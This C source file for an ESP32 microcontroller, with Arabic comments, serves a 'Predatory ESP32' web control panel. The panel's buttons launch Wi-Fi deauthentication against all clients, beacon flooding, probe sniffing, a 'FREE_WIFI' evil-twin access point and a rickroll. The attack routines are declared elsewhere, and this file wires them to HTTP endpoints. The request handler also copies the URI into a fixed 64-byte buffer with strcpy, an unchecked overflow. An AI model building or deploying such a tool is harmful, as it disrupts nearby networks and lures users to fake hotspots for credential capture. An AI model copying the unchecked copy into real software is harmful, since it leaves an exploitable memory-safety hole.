#include <stdio.h>
#include <string.h>
#include "esp_http_server.h"
#include "esp_log.h"

static const char *TAG = "WEB";

// دوال الهجمات (معرفة خارجياً)
extern void deauth_attack(uint8_t *bssid);
extern void beacon_flood(char *ssid);
extern void start_sniffing(void);
extern void evil_twin_start(char *target_ssid);
extern void rickroll_start(void);

// معالج الصفحة الرئيسية
static esp_err_t index_handler(httpd_req_t *req) {
    const char *html = 
        "<!DOCTYPE html>"
        "<html>"
        "<head>"
        "<title>Predatory ESP32</title>"
        "<style>"
        "*{margin:0;padding:0;box-sizing:border-box}"
        "body{background:#0a0a0a;color:#00ff41;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}"
        ".container{text-align:center;border:2px solid #00ff41;padding:40px;border-radius:12px;background:#111}"
        "h1{font-size:2.5em;margin-bottom:30px;text-shadow:0 0 20px #00ff41}"
        ".grid{display:grid;grid-template-columns:1fr 1fr;gap:15px}"
        "button{background:transparent;border:2px solid #00ff41;color:#00ff41;padding:15px 25px;font-size:1.2em;cursor:pointer;border-radius:8px}"
        "button:hover{background:#00ff41;color:#0a0a0a;box-shadow:0 0 30px #00ff41}"
        "#status{margin-top:25px;font-size:1.2em;padding:10px;border:1px solid #00ff41;border-radius:6px}"
        "</style>"
        "</head>"
        "<body>"
        "<div class='container'>"
        "<h1>Predatory ESP32</h1>"
        "<div class='grid'>"
        "<button onclick=\"attack('deauth')\">Deauth Attack</button>"
        "<button onclick=\"attack('beacon')\">Beacon Flood</button>"
        "<button onclick=\"attack('sniff')\">Probe Sniff</button>"
        "<button onclick=\"attack('evil_twin')\">Evil Twin</button>"
        "<button onclick=\"attack('rickroll')\">Rickroll</button>"
        "</div>"
        "<div id='status'>Ready</div>"
        "</div>"
        "<script>"
        "function attack(type){"
        "fetch('/' + type);"
        "document.getElementById('status').textContent = type + ' started';"
        "}"
        "</script>"
        "</body>"
        "</html>";
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, html, strlen(html));
    return ESP_OK;
}

// معالج الهجمات
static esp_err_t attack_handler(httpd_req_t *req) {
    char uri[64];
    strcpy(uri, req->uri);
    
    ESP_LOGI(TAG, "Attack requested: %s", uri);
    
    if (strstr(uri, "/deauth")) {
        uint8_t bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        deauth_attack(bssid);
    } else if (strstr(uri, "/beacon")) {
        beacon_flood("FREE_WIFI");
    } else if (strstr(uri, "/sniff")) {
        start_sniffing();
    } else if (strstr(uri, "/evil_twin")) {
        evil_twin_start("FREE_WIFI");
    } else if (strstr(uri, "/rickroll")) {
        rickroll_start();
    }
    
    httpd_resp_set_type(req, "text/plain");
    httpd_resp_send(req, "OK", 2);
    return ESP_OK;
}

// بدء خادم الويب
void start_web_server(void) {
    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 10;
    
    if (httpd_start(&server, &config) == ESP_OK) {
        httpd_uri_t index_uri = {
            .uri = "/",
            .method = HTTP_GET,
            .handler = index_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(server, &index_uri);
        
        httpd_uri_t attack_uri = {
            .uri = "/*",
            .method = HTTP_GET,
            .handler = attack_handler,
            .user_ctx = NULL
        };
        httpd_register_uri_handler(server, &attack_uri);
        
        ESP_LOGI(TAG, "Web server started!");
    } else {
        ESP_LOGE(TAG, "Failed to start web server!");
    }
}
